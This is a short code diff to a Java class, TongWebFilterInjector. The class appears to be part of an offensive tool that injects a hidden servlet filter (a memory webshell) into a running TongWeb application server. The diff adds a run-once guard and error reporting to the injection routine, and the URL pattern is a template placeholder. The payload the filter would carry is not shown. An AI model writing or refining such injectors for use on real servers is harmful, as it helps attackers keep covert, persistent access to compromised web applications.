@@ -19,6 +19,7 @@ import java.util.zip.GZIPInputStream;
 public class TongWebFilterInjector {
 
     private String msg = "";
+    private static boolean ok = false;
 
     public String getUrlPattern() {
         return "{{urlPattern}}";
@@ -33,13 +34,18 @@ public class TongWebFilterInjector {
     }
 
     public TongWebFilterInjector() {
+        if (ok) {
+            return;
+        }
         Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
             msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts != null) {
+        if (contexts == null) {
+            msg += "context not found";
+        } else {
             for (Object context : contexts) {
                 try {
                     msg += ("context: [" + getContextRoot(context) + "] ");
@@ -51,6 +57,7 @@ public class TongWebFilterInjector {
                 }
             }
         }
+        ok = true;
         System.out.println(msg);
     }
 
